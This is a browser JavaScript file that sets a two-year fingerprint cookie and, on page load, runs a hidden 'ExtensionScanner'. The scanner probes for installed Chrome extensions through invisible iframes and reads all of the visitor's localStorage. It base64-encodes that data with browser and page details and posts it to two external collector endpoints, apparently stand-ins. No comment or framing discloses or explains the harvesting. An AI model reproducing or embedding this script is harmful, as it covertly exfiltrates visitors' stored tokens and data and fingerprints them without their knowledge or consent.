const hostname = window.location.hostname;
function setCookie(name, value, days) {
  var expires = '';
  var currentdomain = ';';
  if (days) {
    var date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = ';expires=' + date.toUTCString();
  }
  const breakString = hostname.split('.');
  const domain = breakString[breakString.length - 2] + '.' + breakString[breakString.length - 1];
  currentdomain = ';domain=' + domain;
  document.cookie = name + '=' + (value || '') + expires + currentdomain + ';SameSite=None;secure;path=/';
}
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
function getCookie(name) {
  var nameEQ = name + '=';
  var ca = document.cookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.localStorageData = {};
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
      }, ExtensionScanner.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, true]);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  collectLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      this.localStorageData[key] = localStorage.getItem(key);
    }
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      localStorageData: this.localStorageData,
      scanDuration: Date.now() - this.startTimestamp,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    this.collectLocalStorage();
    await this.reportResults();
  }
}
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
function uniqueID() {
  function chr4() {
    return Math.random().toString(16).slice(-4);
  }
  return chr4() + chr4() + '-' + chr4() + '-' + chr4() + '-' + chr4() + '-' + chr4() + chr4() + chr4();
}

// Initialize the agent at application startup.
const fpPromise = function () {
  const fingerprint = uniqueID();
  console.log('First Time User:' + fingerprint);
  setCookie('_nw18_fp', fingerprint, 730); //Two year cookie expiry
};
const _nw18_fp = getCookie('_nw18_fp');
if (!_nw18_fp) {
  fpPromise();
} else {
  setCookie('_nw18_fp', _nw18_fp, 730); //Extending cookie expiry everytime
  console.log('Repeat User:' + _nw18_fp);
}
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}